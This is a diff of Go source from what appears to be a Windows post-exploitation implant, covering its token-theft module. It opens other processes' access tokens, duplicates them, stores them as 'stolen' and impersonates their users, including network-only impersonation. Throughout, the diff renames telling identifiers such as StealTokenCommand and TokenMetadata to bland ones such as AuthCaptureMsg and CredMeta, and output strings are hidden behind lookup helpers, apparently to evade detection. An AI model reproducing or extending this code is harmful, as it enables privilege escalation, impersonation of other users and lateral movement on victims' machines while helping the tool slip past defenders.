@@ -93,8 +93,8 @@ func stDot() string { return tokTpl(idxTokDot) }
 
 func stComma() string { return tokTpl(idxTokComma) }
 
-// TokenMetadata stores metadata about a token
-type TokenMetadata struct {
+// CredMeta stores metadata about a token
+type CredMeta struct {
 	User        string
 	Domain      string
 	Source      string // "stolen" or "created"
@@ -106,11 +106,11 @@ type TokenMetadata struct {
 	NetOnly     bool   // Whether this token is for network operations only
 }
 
-// UnifiedTokenStore manages all tokens (stolen and created)
-type UnifiedTokenStore struct {
+// CredStore manages all tokens (stolen and created)
+type CredStore struct {
 	mu              sync.RWMutex
 	Tokens          map[string]syscall.Handle // Named tokens
-	Metadata        map[string]TokenMetadata  // Token metadata
+	Metadata        map[string]CredMeta  // Token metadata
 	ActiveToken     string                    // Currently active token name
 	OriginalUser    string
 	OriginalDomain  string
@@ -120,23 +120,23 @@ type UnifiedTokenStore struct {
 }
 
 // Global token store shared between commands
-var globalTokenStore = &UnifiedTokenStore{
+var globalTokenStore = &CredStore{
 	Tokens:   make(map[string]syscall.Handle),
-	Metadata: make(map[string]TokenMetadata),
+	Metadata: make(map[string]CredMeta),
 }
 
-// StealTokenCommand handles Windows token theft (kept for delegation from TokenCommand)
-type StealTokenCommand struct{}
+// AuthCaptureMsg handles Windows token theft (kept for delegation from CredMsg)
+type AuthCaptureMsg struct{}
 
-func (c *StealTokenCommand) listTokens() CommandResult {
+func (c *AuthCaptureMsg) listTokens() OpResult {
 	var output strings.Builder
 
 	processes, err := getProcessList()
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E43),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -201,21 +201,21 @@ func (c *StealTokenCommand) listTokens() CommandResult {
 	// Summary as compact format: accessible,denied
 	output.WriteString(stNewline() + strconv.Itoa(accessibleCount) + stComma() + strconv.Itoa(deniedCount) + stNewline())
 
-	return CommandResult{
+	return OpResult{
 		Output:      output.String(),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
-func (c *StealTokenCommand) stealAndImpersonate(ctx *CommandContext, pid int, name string, netOnly bool) CommandResult {
+func (c *AuthCaptureMsg) stealAndImpersonate(ctx *OpCtx, pid int, name string, netOnly bool) OpResult {
 	// Open the target process
 	handle, err := OpenProcess(PROCESS_QUERY_INFORMATION, false, uint32(pid))
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E43, fmt.Sprintf("%d", pid)),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 	defer CloseHandle(handle)
@@ -224,10 +224,10 @@ func (c *StealTokenCommand) stealAndImpersonate(ctx *CommandContext, pid int, na
 	var processToken syscall.Token
 	err = OpenProcessToken(handle, TOKEN_QUERY|TOKEN_DUPLICATE, &processToken)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E42),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 	defer processToken.Close()
@@ -268,10 +268,10 @@ func (c *StealTokenCommand) stealAndImpersonate(ctx *CommandContext, pid int, na
 		&impersonationToken,
 	)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E42),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -285,7 +285,7 @@ func (c *StealTokenCommand) stealAndImpersonate(ctx *CommandContext, pid int, na
 
 	// Store new token and metadata
 	globalTokenStore.Tokens[name] = impersonationToken
-	globalTokenStore.Metadata[name] = TokenMetadata{
+	globalTokenStore.Metadata[name] = CredMeta{
 		User:        targetUser,
 		Domain:      targetDomain,
 		Source:      stSourceStolen(),
@@ -312,10 +312,10 @@ func (c *StealTokenCommand) stealAndImpersonate(ctx *CommandContext, pid int, na
 		globalTokenStore.NetOnlyHandle = impersonationToken
 		globalTokenStore.mu.Unlock()
 
-		return CommandResult{
+		return OpResult{
 			Output:      SuccCtx(S1, name),
-			ExitCode:    0,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    0,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -329,10 +329,10 @@ func (c *StealTokenCommand) stealAndImpersonate(ctx *CommandContext, pid int, na
 		globalTokenStore.mu.Unlock()
 		CloseHandle(impersonationToken)
 
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E42),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -342,21 +342,21 @@ func (c *StealTokenCommand) stealAndImpersonate(ctx *CommandContext, pid int, na
 	globalTokenStore.ActiveToken = name
 	globalTokenStore.mu.Unlock()
 
-	return CommandResult{
+	return OpResult{
 		Output:      SuccCtx(S4, name),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
-func (c *StealTokenCommand) storeToken(ctx *CommandContext, pid int, name string, netOnly bool) CommandResult {
+func (c *AuthCaptureMsg) storeToken(ctx *OpCtx, pid int, name string, netOnly bool) OpResult {
 	// Open the target process
 	handle, err := OpenProcess(PROCESS_QUERY_INFORMATION, false, uint32(pid))
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E43, fmt.Sprintf("%d", pid)),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 	defer CloseHandle(handle)
@@ -365,10 +365,10 @@ func (c *StealTokenCommand) storeToken(ctx *CommandContext, pid int, name string
 	var processToken syscall.Token
 	err = OpenProcessToken(handle, TOKEN_QUERY|TOKEN_DUPLICATE, &processToken)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E42),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 	defer processToken.Close()
@@ -397,10 +397,10 @@ func (c *StealTokenCommand) storeToken(ctx *CommandContext, pid int, name string
 		&duplicatedToken,
 	)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E42),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -413,7 +413,7 @@ func (c *StealTokenCommand) storeToken(ctx *CommandContext, pid int, name string
 	}
 
 	globalTokenStore.Tokens[name] = duplicatedToken
-	globalTokenStore.Metadata[name] = TokenMetadata{
+	globalTokenStore.Metadata[name] = CredMeta{
 		User:        targetUser,
 		Domain:      targetDomain,
 		Source:      stSourceStolen(),
@@ -433,23 +433,23 @@ func (c *StealTokenCommand) storeToken(ctx *CommandContext, pid int, name string
 
 	globalTokenStore.mu.Unlock()
 
-	return CommandResult{
+	return OpResult{
 		Output:      SuccCtx(S1, name),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
-func (c *StealTokenCommand) useStoredToken(ctx *CommandContext, name string, netOnly bool) CommandResult {
+func (c *AuthCaptureMsg) useStoredToken(ctx *OpCtx, name string, netOnly bool) OpResult {
 	globalTokenStore.mu.RLock()
 	token, exists := globalTokenStore.Tokens[name]
 	globalTokenStore.mu.RUnlock()
 
 	if !exists {
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E47, name),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -464,10 +464,10 @@ func (c *StealTokenCommand) useStoredToken(ctx *CommandContext, name string, net
 	// Impersonate the token
 	err := ImpersonateLoggedOnUser(token)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E42),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -477,24 +477,24 @@ func (c *StealTokenCommand) useStoredToken(ctx *CommandContext, name string, net
 	globalTokenStore.ActiveToken = name
 	globalTokenStore.mu.Unlock()
 
-	return CommandResult{
+	return OpResult{
 		Output:      SuccCtx(S4, name),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
-func (c *StealTokenCommand) listStoredTokens() CommandResult {
+func (c *AuthCaptureMsg) listStoredTokens() OpResult {
 	var output strings.Builder
 
 	globalTokenStore.mu.RLock()
 	defer globalTokenStore.mu.RUnlock()
 
 	if len(globalTokenStore.Tokens) == 0 {
-		return CommandResult{
+		return OpResult{
 			Output:      Succ(S0),
-			ExitCode:    0,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    0,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -545,41 +545,41 @@ func (c *StealTokenCommand) listStoredTokens() CommandResult {
 		globalTokenStore.NetOnlyToken + stPipe() +
 		currentDomain + stBackslash() + currentUser + stNewline())
 
-	return CommandResult{
+	return OpResult{
 		Output:      output.String(),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
-func (c *StealTokenCommand) removeStoredToken(ctx *CommandContext, name string) CommandResult {
+func (c *AuthCaptureMsg) removeStoredToken(ctx *OpCtx, name string) OpResult {
 	globalTokenStore.mu.Lock()
 	defer globalTokenStore.mu.Unlock()
 
 	token, exists := globalTokenStore.Tokens[name]
 	if !exists {
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E47, name),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	// Don't allow removing the active token
 	if globalTokenStore.IsImpersonating && globalTokenStore.ActiveToken == name {
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E48, name),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	// Don't allow removing the active network-only token
 	if globalTokenStore.NetOnlyToken == name {
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E48, name),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -590,14 +590,14 @@ func (c *StealTokenCommand) removeStoredToken(ctx *CommandContext, name string) 
 	delete(globalTokenStore.Tokens, name)
 	delete(globalTokenStore.Metadata, name)
 
-	return CommandResult{
+	return OpResult{
 		Output:      SuccCtx(S2, name),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
-func (c *StealTokenCommand) getCurrentTokenInfo() CommandResult {
+func (c *AuthCaptureMsg) getCurrentTokenInfo() OpResult {
 	var output strings.Builder
 	output.WriteString(stTokenInfo())
 
@@ -635,23 +635,23 @@ func (c *StealTokenCommand) getCurrentTokenInfo() CommandResult {
 		output.WriteString(stOrigUserPre() + globalTokenStore.OriginalDomain + stBackslash() + globalTokenStore.OriginalUser + stNewline())
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:      output.String(),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
-func (c *StealTokenCommand) setNetOnlyToken(ctx *CommandContext, name string) CommandResult {
+func (c *AuthCaptureMsg) setNetOnlyToken(ctx *OpCtx, name string) OpResult {
 	globalTokenStore.mu.Lock()
 	defer globalTokenStore.mu.Unlock()
 
 	token, exists := globalTokenStore.Tokens[name]
 	if !exists {
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E47, name),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -663,22 +663,22 @@ func (c *StealTokenCommand) setNetOnlyToken(ctx *CommandContext, name string) Co
 	metadata.NetOnly = true
 	globalTokenStore.Metadata[name] = metadata
 
-	return CommandResult{
+	return OpResult{
 		Output:      SuccCtx(S1, name),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
-func (c *StealTokenCommand) clearNetOnlyToken(ctx *CommandContext) CommandResult {
+func (c *AuthCaptureMsg) clearNetOnlyToken(ctx *OpCtx) OpResult {
 	globalTokenStore.mu.Lock()
 	defer globalTokenStore.mu.Unlock()
 
 	if globalTokenStore.NetOnlyToken == "" {
-		return CommandResult{
+		return OpResult{
 			Output:      Succ(S0),
-			ExitCode:    0,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    0,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -692,14 +692,14 @@ func (c *StealTokenCommand) clearNetOnlyToken(ctx *CommandContext) CommandResult
 	globalTokenStore.NetOnlyToken = ""
 	globalTokenStore.NetOnlyHandle = 0
 
-	return CommandResult{
+	return OpResult{
 		Output:      SuccCtx(S2, previousToken),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
-func (c *StealTokenCommand) showNetOnlyStatus() CommandResult {
+func (c *AuthCaptureMsg) showNetOnlyStatus() OpResult {
 	globalTokenStore.mu.RLock()
 	defer globalTokenStore.mu.RUnlock()
 
@@ -733,15 +733,15 @@ func (c *StealTokenCommand) showNetOnlyStatus() CommandResult {
 		output.WriteString(stIndent2() + stNone() + stNewline())
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:      output.String(),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
 // Helper functions
-func (c *StealTokenCommand) getCurrentUserInfo() (string, string) {
+func (c *AuthCaptureMsg) getCurrentUserInfo() (string, string) {
 	// Try to get from current thread token first (impersonation)
 	var threadToken syscall.Token
 	err := OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, true, &threadToken)
@@ -760,7 +760,7 @@ func (c *StealTokenCommand) getCurrentUserInfo() (string, string) {
 	return stUnknown(), stUnknown()
 }
 
-func (c *StealTokenCommand) getTokenUserInfo(token syscall.Handle) (string, string) {
+func (c *AuthCaptureMsg) getTokenUserInfo(token syscall.Handle) (string, string) {
 	// Get required buffer size
 	var needed uint32
 	procGetTokenInformation.Call(
@@ -817,14 +817,14 @@ func (c *StealTokenCommand) getTokenUserInfo(token syscall.Handle) (string, stri
 }
 
 // getProcessList returns a list of all processes
-func getProcessList() ([]ProcessInfo, error) {
+func getProcessList() ([]PI, error) {
 	snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
 	if err != nil {
 		return nil, err
 	}
 	defer syscall.CloseHandle(snapshot)
 
-	var processes []ProcessInfo
+	var processes []PI
 
 	var pe32 syscall.ProcessEntry32
 	pe32.Size = uint32(unsafe.Sizeof(pe32))
@@ -836,7 +836,7 @@ func getProcessList() ([]ProcessInfo, error) {
 
 	for {
 		processName := syscall.UTF16ToString(pe32.ExeFile[:])
-		processes = append(processes, ProcessInfo{
+		processes = append(processes, PI{
 			PID:  int32(pe32.ProcessID),
 			Name: processName,
 		})
